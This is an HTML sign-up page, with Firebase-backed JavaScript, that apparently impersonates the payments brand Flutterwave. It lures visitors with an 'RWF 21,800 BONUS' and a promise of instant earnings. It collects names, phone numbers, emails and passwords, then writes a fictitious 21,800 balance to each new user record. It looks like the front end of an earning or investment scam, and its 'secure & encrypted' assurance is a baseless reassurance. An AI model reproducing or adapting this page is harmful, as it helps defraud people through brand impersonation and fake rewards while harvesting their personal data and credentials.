<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>FLUTTERWAVE - Sign Up</title>

  <style>
    * { box-sizing: border-box; }

    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: linear-gradient(135deg, #a000ff, #00c6ff);
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .container {
      width: 100%;
      max-width: 420px;
      background: #fff;
      border-radius: 22px;
      padding: 35px 25px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.15);
      animation: fadeIn 0.6s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .logo h3 {
      margin: 0;
      color: #a000ff;
      font-weight: 700;
      letter-spacing: 0.5px;
    }

    h2 {
      margin: 15px 0 10px;
      font-size: 22px;
    }

    .bonus {
      background: #1dcf82;
      color: #fff;
      padding: 4px 10px;
      font-size: 12px;
      border-radius: 6px;
      margin-left: 8px;
    }

    p {
      color: #666;
      font-size: 14px;
      line-height: 1.5;
      margin-bottom: 25px;
    }

    .form-group {
      margin-bottom: 15px;
      position: relative;
    }

    .form-group input {
      width: 100%;
      padding: 12px 14px;
      border-radius: 12px;
      border: 1px solid #ddd;
      font-size: 14px;
      outline: none;
      transition: 0.3s;
    }

    .form-group input:focus {
      border-color: #a000ff;
      box-shadow: 0 0 0 2px rgba(160,0,255,0.12);
    }

    .toggle-password {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 13px;
      color: #777;
      cursor: pointer;
      user-select: none;
    }

    small {
      color: red;
      font-size: 12px;
      display: none;
      margin-top: 5px;
    }

    .confirm-section {
      margin: 18px 0;
      font-size: 14px;
    }

    .confirm-section label {
      display: flex;
      gap: 8px;
      align-items: center;
      cursor: pointer;
    }

    .create-btn {
      width: 100%;
      background: linear-gradient(135deg, #28a745, #20c997);
      color: #fff;
      padding: 12px;
      font-size: 16px;
      border: none;
      border-radius: 14px;
      cursor: pointer;
      transition: transform 0.2s, box-shadow 0.2s;
    }

    .create-btn:disabled {
      background: #b5e3c3;
      cursor: not-allowed;
      box-shadow: none;
      transform: none;
    }

    .create-btn:hover:enabled {
      transform: translateY(-1px);
      box-shadow: 0 10px 20px rgba(0,0,0,0.15);
    }

    .login-text {
      margin-top: 20px;
      font-size: 14px;
      text-align: center;
    }

    .login-text a {
      color: #007bff;
      text-decoration: none;
      font-weight: 500;
    }

    .login-text a:hover {
      text-decoration: underline;
    }

    .footer-note {
      margin-top: 18px;
      font-size: 12px;
      color: #888;
      text-align: center;
    }
  </style>
</head>

<body>

<div class="container">
  <div class="logo">
    <h3>FLUTTERWAVE</h3>
  </div>

  <h2>Sign Up <span class="bonus">RWF 21,800 BONUS</span></h2>
  <p>Create your free account and start earning instantly.</p>

  <form>
    <div class="form-group">
      <input type="text" id="fullName" placeholder="Full Name" required>
    </div>

    <div class="form-group">
      <input type="text" id="username" placeholder="Username" required>
    </div>

    <div class="form-group">
      <input type="tel" id="phoneNumber" placeholder="Phone Number" required>
    </div>

    <div class="form-group">
      <input type="email" id="email" placeholder="Email Address" required>
    </div>

    <div class="form-group">
      <input type="password" id="password" placeholder="Password" required>
      <span class="toggle-password" onclick="togglePassword('password')">Show</span>
    </div>

    <div class="form-group">
      <input type="password" id="confirmPassword" placeholder="Confirm Password" required>
      <span class="toggle-password" onclick="togglePassword('confirmPassword')">Show</span>
      <small id="passwordError">Passwords do not match.</small>
    </div>

    <div class="confirm-section">
      <label>
        <input type="checkbox" id="confirmCheckbox">
        I confirm my registration details
      </label>
    </div>
  </form>

  <button id="okBtn" class="create-btn" disabled>CREATE ACCOUNT</button>

  <div class="login-text">
    Already have an account? <a href="Login.html">Log in</a>
  </div>

  <div class="footer-note">
    ðŸ”’ Your data is secure & encrypted
  </div>
</div>

<!-- Firebase -->
<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
  import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
  import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyCbuLoyGu6v7dJUDQ0iM2DkvEZs0D9z2Do",
    authDomain: "mfs-africa-ltd.firebaseapp.com",
    databaseURL: "https://mfs-africa-ltd-default-rtdb.firebaseio.com",
    projectId: "mfs-africa-ltd",
    storageBucket: "mfs-africa-ltd.appspot.com",
    messagingSenderId: "686833267635",
    appId: "1:686833267635:web:c5a531346887f6452bd1c6"
  };

  const app = initializeApp(firebaseConfig);
  const auth = getAuth(app);
  const db = getDatabase(app);

  const checkbox = document.getElementById('confirmCheckbox');
  const okBtn = document.getElementById('okBtn');
  const passwordError = document.getElementById('passwordError');

  checkbox.addEventListener('change', async (e) => {
    if (!e.target.checked) return;

    const fullName = document.getElementById('fullName').value.trim();
    const username = document.getElementById('username').value.trim();
    const phone = document.getElementById('phoneNumber').value.trim();
    const email = document.getElementById('email').value.trim();
    const pass = document.getElementById('password').value;
    const confirm = document.getElementById('confirmPassword').value;

    if (!fullName || !username || !phone || !email || !pass || !confirm) {
      alert("Please fill in all fields.");
      e.target.checked = false;
      return;
    }

    if (pass !== confirm) {
      passwordError.style.display = "block";
      e.target.checked = false;
      return;
    } else {
      passwordError.style.display = "none";
    }

    try {
      const cred = await createUserWithEmailAndPassword(auth, email, pass);
      await set(ref(db, 'users/' + cred.user.uid), {
        uid: cred.user.uid,
        name: fullName,
        username,
        phone,
        email,
        balance: 21800,
        bonus: 0,
        deposit: 0,
        createdAt: Date.now()
      });

      okBtn.disabled = false;
      checkbox.disabled = true;

    } catch (err) {
      alert(err.message);
      e.target.checked = false;
    }
  });

  okBtn.onclick = () => {
    if (!okBtn.disabled) location.href = "Login.html";
  };

  window.togglePassword = (id) => {
    const input = document.getElementById(id);
    input.type = input.type === "password" ? "text" : "password";
  };
</script>

</body>
</html>
